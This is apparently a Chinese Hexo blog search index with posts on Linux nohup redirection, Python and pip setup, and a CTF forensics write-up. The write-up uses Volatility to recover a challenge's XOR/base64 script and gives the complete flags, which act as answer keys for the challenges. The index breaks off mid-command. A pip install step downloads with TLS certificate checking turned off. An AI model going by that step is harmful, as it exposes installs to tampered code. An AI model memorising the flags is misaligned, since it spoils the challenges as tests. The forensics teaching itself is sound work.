<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux命令行输出</title>
      <link href="/linux/linux-ming-ling-xing-shu-chu/"/>
      <url>/linux/linux-ming-ling-xing-shu-chu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我们在一些Linux下的shell脚本中经常会碰到<code>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;</code>这样形式的命令&gt;我们在一些Linux下的shell脚本中经常会碰到<code>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;</code>这样形式的命令。<br>那么这条命令应该怎么理解呢？首先我们对这条命令进行拆分：</p></blockquote><h2 id="nohup和-后台运行"><a href="#nohup和-后台运行" class="headerlink" title="nohup和&amp;后台运行"></a>nohup和&amp;后台运行</h2><h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><ol><li>用途：no hang up（不挂起），用于在系统后台不挂断地运行命令，<code>退出终端</code>不会影响程序的运行。</li><li>语法：nohup command [arg] [&amp;]</li><li>在默认情况下（非重定向时），会输出一个名叫<code>nohup.out</code>的文件到当前目录下，如果当前目录的<code>nohup.out</code>文件不可写，输出重定向到<code>$HOME/nohup.out</code>文件中。</li></ol><h3 id=""><a href="#" class="headerlink" title="&amp;"></a>&amp;</h3><ol><li>用途：使程序在后台运行，退出终端退出后命令仍旧执行。</li></ol><blockquote><p>综合起来看就是<br>使用&amp;后台运行程序：<br>结果会输出到终端<br>使用Ctrl + C发送SIGINT信号，程序免疫<br>关闭session发送SIGHUP信号，程序关闭</p><hr><p>使用nohup运行程序：<br>结果默认会输出到nohup.out<br>使用Ctrl + C发送SIGINT信号，程序关闭<br>关闭session发送SIGHUP信号，程序免疫</p><hr><p>平日线上经常使用nohup和&amp;配合来启动程序&gt; nohup .&#x2F;test &amp;：<br>同时免疫SIGINT和SIGHUP信号</p></blockquote><h2 id="终止后台程序"><a href="#终止后台程序" class="headerlink" title="终止后台程序"></a>终止后台程序</h2><ol><li>终端未关闭<br><code>jobs -l</code>该命令可以带进程号显示作业列表，之后<code>kill pid</code>即可</li><li>终端已关闭<br>在终端关闭后，<code>jobs</code>就无法显示作业列表了，这个时候就只能通过<code>ps -ef</code>在进程列表里查找</li></ol><h2 id="几个基本符号及其含义"><a href="#几个基本符号及其含义" class="headerlink" title="几个基本符号及其含义"></a>几个基本符号及其含义</h2><ul><li>&#x2F;dev&#x2F;null 表示空设备文件，也就是输出到一个“黑洞”里，最终不会获取输出</li><li>0 表示stdin标准输入</li><li>1 表示stout标准输出</li><li>2 表示sterr标准错误</li><li>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</li></ul><blockquote><p>从<code>command &gt;/dev/null</code>来看，这其实一个缩写的命令，对于一个重定向的命令，肯定是<code>command &gt;a</code>这种形式，它默认等于<code>command 1 &gt;a</code>，即将标准输出结果重定向到文件a中，</p></blockquote><p>通过上面command &gt; &#x2F;dev&#x2F;null等价于command 1 &gt; &#x2F;dev&#x2F;null,那么对于2&gt;&amp;1也就好理解了，2就是标准错误，1是标准输出，那么这条命令不就是相当于把标准错误重定向到标准输出么。但是是&amp;1而不是1，这里&amp;是什么？这里&amp;相当于等效于标准输出。</p><ul><li>2&gt;&amp;1，意思是错误输出等同于标准输出。所以使得.&#x2F;test.sh &gt;test.log，可以把标准输出和错误输出全部导入日志test.log里。</li><li>注意：2&gt;&amp;1，中间不能有空格。</li><li>注意：2&gt;&amp;1，必须写在最后，否则会失去原有意义</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础安装配置</title>
      <link href="/python/python-ji-chu-an-zhuang-pei-zhi/"/>
      <url>/python/python-ji-chu-an-zhuang-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Python下载"><a href="#Python下载" class="headerlink" title="Python下载"></a>Python下载</h1><ul><li><a href="https://www.python.org/ftp/python/">Python下载地址</a></li></ul><h2 id="编码中文支持"><a href="#编码中文支持" class="headerlink" title="编码中文支持"></a>编码中文支持</h2><ul><li>Python 声明编码格式 # -<em>- coding: utf-8 -</em>- 用来支持中文</li></ul><h1 id="Python虚拟化"><a href="#Python虚拟化" class="headerlink" title="Python虚拟化"></a>Python虚拟化</h1><h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><h4 id="安装pyenv"><a href="#安装pyenv" class="headerlink" title="安装pyenv"></a>安装pyenv</h4><p><code>brew install pyenv</code></p><h4 id="国内加速安装python环境"><a href="#国内加速安装python环境" class="headerlink" title="国内加速安装python环境"></a>国内加速安装python环境</h4><p><code>v=3.8.6;wget https://npm.taobao.org/mirrors/python/$v/Python-$v.tar.xz -P ~/.pyenv/cache/;pyenv install $v</code></p><h4 id="macos-bigsur安装"><a href="#macos-bigsur安装" class="headerlink" title="macos bigsur安装"></a>macos bigsur安装</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CFLAGS</span><span class="token operator">=</span><span class="token string">"-I<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> openssl<span class="token variable">)</span></span>/include -I<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> <span class="token function">bzip2</span><span class="token variable">)</span></span>/include -I<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> readline<span class="token variable">)</span></span>/include -I<span class="token variable"><span class="token variable">$(</span>xcrun --show-sdk-path<span class="token variable">)</span></span>/usr/include"</span> <span class="token assign-left variable">LDFLAGS</span><span class="token operator">=</span><span class="token string">"-L<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> openssl<span class="token variable">)</span></span>/lib -L<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> readline<span class="token variable">)</span></span>/lib -L<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> zlib<span class="token variable">)</span></span>/lib -L<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> <span class="token function">bzip2</span><span class="token variable">)</span></span>/lib"</span> pyenv <span class="token function">install</span> <span class="token parameter variable">--patch</span> <span class="token number">3.8</span>.6 <span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> <span class="token parameter variable">-sSL</span> https://github.com/python/cpython/commit/8ea6353.patch<span class="token punctuation">\</span>?full_index<span class="token punctuation">\</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><h1 id="Python库"><a href="#Python库" class="headerlink" title="Python库"></a>Python库</h1><h2 id="安装gmpy2"><a href="#安装gmpy2" class="headerlink" title="安装gmpy2"></a>安装gmpy2</h2><ul><li><p>Windows<br>wheel 安装</p></li><li><p>macOS</p>  <pre class="language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> gmpbrew <span class="token function">install</span> mpfrbrew <span class="token function">install</span> libmpcpip <span class="token function">install</span> gmpy2</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip基础安装配置</title>
      <link href="/python/pip-ji-chu-an-zhuang-pei-zhi/"/>
      <url>/python/pip-ji-chu-an-zhuang-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ol><li>Windows</li></ol><ul><li>Windows下安装Python3时默认安装pip，将Python安装目录下的scripts目录加入环境变量即可使用</li><li>对于Python2的pip需要在安装完Python2后，下载脚本进行安装</li></ul><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>1.下载安装执行脚本<br><code> curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code><br>或者<br><code>wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate</code></p><p>2.执行安装<br><code> python get-pip.py</code>  </p><h1 id="更换pip源"><a href="#更换pip源" class="headerlink" title="更换pip源"></a>更换pip源</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~ <span class="token function">mkdir</span> .pip <span class="token function">vi</span> pip.conf<span class="token punctuation">[</span>global<span class="token punctuation">]</span> index-url <span class="token operator">=</span> https://pypi.tuna.tsinghua.edu.cn/simple</code></pre><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><ul><li>在user目录中创建一个pip目录，如：<code>C:\Users\xx\pip</code>，新建文件pip.ini,内容如下：</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url<span class="token operator">=</span>https://pypi.tuna.tsinghua.edu.cn/simple<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host<span class="token operator">=</span>pypi.tuna.tsinghua.edu.cn</code></pre><ul><li>其他国内源</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">http://pypi.douban.com/ 豆瓣http://pypi.hustunique.com/ 华中理工大学http://pypi.sdutlinux.org/ 山东理工大学http://pypi.mirrors.ustc.edu.cn/ 中国科学技术大学</code></pre><h1 id="多版本共存"><a href="#多版本共存" class="headerlink" title="多版本共存"></a>多版本共存</h1><ul><li>直接执行“pip xxx”时会调用pythonX版本的pip，如需执行pythonY版本的，则需要加上“PythonY -m”</li><li>Windows环境下可以将pip2&#x2F;pip3加入环境变量</li><li>Linux&#x2F;macOS下则可以通过软链接或者shell别名的方式</li></ul><h1 id="pip使用方法"><a href="#pip使用方法" class="headerlink" title="pip使用方法"></a>pip使用方法</h1><ul><li><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">pip镜像仓库</a></p></li><li><p>使用方法：<br><code>pip &lt;command&gt; [options]</code></p></li><li><p>相关命令如下：</p>  <pre class="language-bash" data-language="bash"><code class="language-bash"> <span class="token comment">#安装包  </span>pip <span class="token function">install</span>  <span class="token punctuation">[</span>package<span class="token punctuation">]</span>         <span class="token comment">#卸载包 </span>pip uninstall <span class="token punctuation">[</span>package<span class="token punctuation">]</span>    <span class="token comment">#以需求文件的格式输出以安装的包,无法通过install安装的包默认不显示 </span>pip freeze <span class="token comment">#列出以安装的包</span> pip list                              <span class="token comment">#显示以安装包的信息 </span>pip show <span class="token punctuation">[</span>package<span class="token punctuation">]</span>        <span class="token comment">#验证已经安装的包具有兼容的依赖文件</span> pip check                         <span class="token comment">#计算包的hash值  </span>pip <span class="token builtin class-name">hash</span>                         </code></pre></li><li><p>如需查找options，加上–help即可</p></li><li><p>常用命令如下：</p>  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#在线安装包</span> pip <span class="token function">install</span> package_name      <span class="token comment">#本地安装 </span>pip <span class="token function">install</span> <span class="token parameter variable">-t</span> %Python_home%/site-packages/         package_name pip <span class="token function">install</span> 下载的.whl结尾的文件的绝对地址+文件名<span class="token punctuation">(</span>使用此方法需先执行<span class="token variable"><span class="token variable">`</span>pip <span class="token function">install</span> wheel<span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token comment">#安装指定版本的包</span> pip <span class="token function">install</span> <span class="token assign-left variable">applicationName</span><span class="token operator">==</span>version   <span class="token comment">#检查需要更新的包  </span>pip list <span class="token parameter variable">--outdated</span>       <span class="token comment">#升级到指定版本 </span>pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> package_name     pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> <span class="token assign-left variable">keras</span><span class="token operator">==</span><span class="token number">2.1</span>.0    </code></pre></li></ul><h1 id="pip虚拟化"><a href="#pip虚拟化" class="headerlink" title="pip虚拟化"></a>pip虚拟化</h1><h2 id="pipenv"><a href="#pipenv" class="headerlink" title="pipenv"></a>pipenv</h2><p>在使用pipenv之前，必须彻底的忘记pip这个东西</p><ol><li><p>安装 <code>pip3 install pipenv</code>    (pip3安装的会指向Python3)</p></li><li><p>新建一个项目文件：letgo</p></li><li><p>进入文件夹：cd letgo</p></li><li><p>指定虚拟环境使用哪个版本的python</p><pre><code>`pipenv --three` 会使用当前系统的Python3创建环境</code></pre></li><li><p>换成国内镜像，被墙网速慢</p><p>   编辑文件letgo&#x2F;Pipfile<br>   将 url &#x3D; “<a href="https://pypi.org/simple">https://pypi.org/simple</a>“ 替换成国内镜像<br>   url &#x3D; “<a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a>“</p></li><li><p>激活虚拟环境</p><pre><code>pipenv shell (进入虚拟环境)(新建的虚拟环境存放在/root/.local/share/virtualenvs/下，想要删除这个环境，直接删除这个文件夹)</code></pre></li><li><p>pipenv install django&#x3D;&#x3D;1.11 安装固定版本模块，并加入到Pipfile</p></li><li><p>当项目放到阿里云上时，直接运行：pipenv install 就能自动生成一份和本地环境，一模一样的环境</p></li><li><p>常用命令：</p></li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">pipenv graph                  查看目前安装的库及其依赖pipenv uninstall <span class="token parameter variable">--all</span>        卸载全部包并从Pipfile中移除pipenv uninstall <span class="token assign-left variable">django</span><span class="token operator">==</span><span class="token number">1.11</span> 卸载指定包并从Pipfile中移除pipenv update requests        <span class="token comment"># 更新指定个包</span>pipenv update                 <span class="token comment"># 更新所有的包</span>pipenv shell  <span class="token comment"># 进入环境</span><span class="token builtin class-name">exit</span>  <span class="token comment"># 退出环境</span>pipenv <span class="token parameter variable">--rm</span>   <span class="token comment"># 删除虚拟环境</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macOS </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-misc-memory</title>
      <link href="/ctf/wiki/ctf-misc-memory/"/>
      <url>/ctf/wiki/ctf-misc-memory/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文题目链接: <a href="https://pan.baidu.com/s/1sSaO2-9nzPUdNBkk9AAzXQ">https://pan.baidu.com/s/1sSaO2-9nzPUdNBkk9AAzXQ</a> 提取码: p2se </p></blockquote><h2 id="磁盘内存分析"><a href="#磁盘内存分析" class="headerlink" title="磁盘内存分析"></a>磁盘内存分析</h2><h3 id="常用工具-命令"><a href="#常用工具-命令" class="headerlink" title="常用工具&amp;命令"></a>常用工具&amp;命令</h3><ul><li><p><a href="http://www.sweetscape.com/010editor/">010 Editor</a></p></li><li><p><a href="https://ctf-wiki.github.io/ctf-tools/misc/#_6">Elcomsoft Forensic Disk Decryptor</a></p></li><li><p><a href="https://github.com/volatilityfoundation/volatility">Volatility</a></p></li></ul><h3 id="磁盘格式"><a href="#磁盘格式" class="headerlink" title="磁盘格式"></a>磁盘格式</h3><p>常见的磁盘分区格式有以下几种</p><ul><li>Windows: FAT12 -&gt; FAT16 -&gt; FAT32 -&gt; NTFS</li><li>Linux: EXT2 -&gt; EXT3 -&gt; EXT4</li><li>FAT 主磁盘结构<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/forensic-filesys.jpg" alt="forensic-filesys"></li><li>删除文件：目录表中文件名第一字节 <code>e5</code>。</li></ul><h3 id="VMDK"><a href="#VMDK" class="headerlink" title="VMDK"></a>VMDK</h3><p>VMDK 文件本质上是物理硬盘的虚拟版，也会存在跟物理硬盘的分区和扇区中类似的填充区域，我们可以利用这些填充区域来把我们需要隐藏的数据隐藏到里面去，这样可以避免隐藏的文件增加了 VMDK 文件的大小（如直接附加到文件后端），也可以避免由于 VMDK 文件大小的改变所带来的可能导致的虚拟机错误。而且 VMDK 文件一般比较大，适合用于隐藏大文件。</p><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><ul><li>解析 Windows &#x2F; Linux &#x2F; Mac OS X 内存结构</li><li>分析进程，内存数据</li><li>根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据</li></ul><blockquote><p>下面通过几道题目来看一下相关工具的使用以及内存分析的套路</p></blockquote><h2 id="例题-Rctf-磁盘取证"><a href="#例题-Rctf-磁盘取证" class="headerlink" title="例题-Rctf-磁盘取证"></a>例题-Rctf-磁盘取证</h2><p>这道题首先要了解一个冷知识</p><blockquote><p>VMDK：（VMWare Virtual Machine Disk Format）是虚拟机VMware创建的虚拟硬盘格式，文件存在于VMware文件系统中，被称为VMFS（虚拟机文件系统）,可以用7z打开</p></blockquote><p>拿到<code>encrypt.vmdk</code>这个文件首先想到的就是做内存分析或者恢复虚拟机,但是这里使用volatility分析失败。虚拟机创建也失败。</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f encrypt.vmdk imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : No suggestion (Instantiated with no profile)                     AS Layer1 : FileAddressSpace (&#x2F;Users&#x2F;...&#x2F;encrypt.vmdk)                      PAE type : No PAE</code></pre><p>于是用010editor打开，在中部发现了大量重复字符。<code>rctf&#123;unseCure_quick_form4t_vo1ume</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025151437.png" alt="20211025151437"></p><p>这里获取了前半段flag之后我们就需要找后半段了，接着用7z提取出来<code>0.FAT</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025152108.png" alt="20211025152108"></p><p>下面是另外一个知识了</p><blockquote><p>FAT格式： 即FAT16,这是MS－DOS和最早期的Win 95操作系统中最常见的磁盘分区格式。它采用16位的文件分配表，能支持最大为2GB的分区，几乎所有的操作系统都支持这一种格式，从DOS、Win 95、Win 97到现在的Win 98、Windows NT、Win2000，但是在FAT16分区格式中，它有一个最大的缺点：磁盘利用效率低。因为在DOS和Windows系统中，磁盘文件的分配是以簇为单位的，一个簇只分配给一个文件使用，不管这个文件占用整个簇容量的多少。这样，即使一个文件很小的话，它也要占用了一个簇，剩余的空间便全部闲置在那里，形成了磁盘空间的浪费。由于分区表容量的限制，FAT16支持的分区越大，磁盘上每个簇的容量也越大，造成的浪费也越大。所以为了解决这个问题，微软公司在Win 97中推出了一种全新的磁盘分区格式FAT32</p></blockquote><p>挂载之后我们获取了两个文件<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025153205.png" alt="20211025153205"></p><p>图片叫我们忽略它，于是打开<code>password.txt</code>里面内容为<code>Password 2: RCTF2019</code></p><p>这里涉及到第三个知识：</p><blockquote><p>使用不同的密码挂载出来的内容是不一样的</p></blockquote><p>这里我们挂载成功以后发现打不开<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025153534.png" alt="20211025153534"></p><p>这里选择Winhex打开磁盘<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025154425.png" alt="20211025154425"><br>获取后半段flag<code>_and_corrupted_1nner_v0lume&#125;_and_corrupted_1nner_v0lume&#125;</code></p><h2 id="例题-find-secret"><a href="#例题-find-secret" class="headerlink" title="例题-find_secret"></a>例题-find_secret</h2><p>拿到这个题目，首先确定一下内存的类型</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f 2.data imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : WinXPSP1x64, Win2003SP1x64, WinXPSP2x64, Win2003SP2x64                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)                     AS Layer2 : FileAddressSpace (&#x2F;Users&#x2F;secgxx&#x2F;Desktop&#x2F;CTF&#x2F;0x04MISC&#x2F;内存分析&#x2F;例题-内存分析1&#x2F;2.data)                      PAE type : No PAE                           DTB : 0x153000L                          KDBG : 0xf800011b3d40L          Number of Processors : 2     Image Type (Service Pack) : 2                KPCR for CPU 0 : 0xfffff800011b5000L                KPCR for CPU 1 : 0xfffffadff5a6b000L             KUSER_SHARED_DATA : 0xfffff78000000000L           Image date and time : 2019-08-17 07:30:53 UTC+0000     Image local date and time : 2019-08-17 15:30:53 +0800</code></pre><p>确定了镜像类型以后，我们常用的几个插件有 <code>cmdline</code>，<code>filesacn</code>，<code>psscan</code>，<code>memdump</code>，<code>dumpfiles</code>等几个插件。</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f 2.data --profile&#x3D;WinXPSP1x64 cmdlineVolatility Foundation Volatility Framework 2.6.1*********************************************************pythonw.exe pid:   2364Command line : &quot;C:\Python34\pythonw.exe&quot;  &quot;C:\Python34\Lib\idlelib\idle.pyw&quot; -e &quot;C:\Documents and Settings\Administrator\桌面\create_secret.py&quot;</code></pre><p>通过cmdline我们发现了<code>create_secret.py</code>这么个东西，因此我们接着用<code>filescan</code></p><p>这个时候问题来了</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f 2.data --profile&#x3D;WinXPSP1x64 filescan|grep 桌面Volatility Foundation Volatility Framework 2.6.10x0000000005a5b3f0      1      1 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面0x0000000005accb90      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\桌面0x0000000005accf10      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面0x0000000005acec10      1      0 -W-rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\lalala.secret0x000000000b03d470      1      1 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面volatility -f 2.data --profile&#x3D;WinXPSP1x64 dumpfiles -Q 0x0000000005acec10 -D .Volatility Foundation Volatility Framework 2.6.1DataSectionObject 0x05acec10   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\lalala.secret</code></pre><p>导出来之后呢其实就获取了加密脚本输出的内容</p><pre class="language-console" data-language="console"><code class="language-console">c1IufV1PRUZOX1VtTyYiIE9BRXJxeyZSWyRVc0MmIiJPQS52cU9FUkN6XXVyQlJ7c1JFQHJBI3xGeWNzcXtnL3QkZyNccCoq</code></pre><p>但是我们只在桌面发现了一个由python脚本生成的加密文件，加密脚本怎么获取呢</p><p>注意到这个脚本是由<code>pythonw.exe</code>运行了的，因此考虑使用<code>memdump</code></p><pre class="language-console" data-language="console"><code class="language-console">volatility -f 2.data --profile&#x3D;WinXPSP1x64 psscan|grep pythonVolatility Foundation Volatility Framework 2.6.10x0000000005a79040 pythonw.exe        2412   2364 0x000000000dc1c000 2019-08-17 07:30:40 UTC+00000x000000000b03d040 pythonw.exe        2364   1460 0x0000000008048000 2019-08-17 07:30:31 UTC+0000volatility -f 2.data --profile&#x3D;WinXPSP1x64 memdump -p 2364 -D .Volatility Foundation Volatility Framework 2.6.1************************************************************************Writing pythonw.exe [  2364] to 2364.dmp</code></pre><p>接下来就是从内存里面把create_secret.py，用010editor打开，因为我们已经知道了最终生成的文件是<code>lalala.secret</code>，因此我们直接搜索lalala</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211022153702.png" alt="20211022153702"></p><p>最终我们在地址<code>990BC5h</code>获取脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#/usr/bin/env python</span><span class="token comment">#-*- coding:utf-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token comment"># flag&#123; this is not flag, it's just a comment in python source file.I hide some secret with python, I don't think you can found it.</span>secret_file_name <span class="token operator">=</span> <span class="token string">'flag.txt'</span>secret_file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> secret_file_name<span class="token punctuation">)</span>secret <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>secret_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    secret <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>secret_file_path<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Set a value 0x00 &lt; key &lt; 0xff:"</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> content<span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">)</span>    <span class="token keyword">return</span> b64encode<span class="token punctuation">(</span>result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    secret <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'str'</span><span class="token punctuation">:</span>        secret <span class="token operator">=</span> secret<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>result_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lalala.secret'</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>result_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这里就清楚了，加密脚本一共进行了三次异或和base64编码的组合操作，最终获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211022160626.png" alt="20211022160626"></p><p>这里我们重复三次就可以了，也可以通过这个发现了key是0x17，写个小脚本也可以</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211022161035.png" alt="20211022161035"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodecipher<span class="token operator">=</span><span class="token string">'c1IufV1PRUZOX1VtTyYiIE9BRXJxeyZSWyRVc0MmIiJPQS52cU9FUkN6XXVyQlJ7c1JFQHJBI3xGeWNzcXtnL3QkZyNccCoq'</span>key<span class="token operator">=</span><span class="token string">'0x17'</span>key <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher <span class="token operator">=</span>  b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> cipher    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">)</span>    cipher <span class="token operator">=</span> result    <span class="token keyword">print</span> cipher</code></pre><h2 id="例题-easy-dump（2018护网杯）"><a href="#例题-easy-dump（2018护网杯）" class="headerlink" title="例题-easy_dump（2018护网杯）"></a>例题-easy_dump（2018护网杯）</h2><p>老规矩，volatility梭哈一波先</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> easy_dump.img imageinfoVolatility Foundation Volatility Framework <span class="token number">2.6</span>.1INFO    <span class="token builtin class-name">:</span> 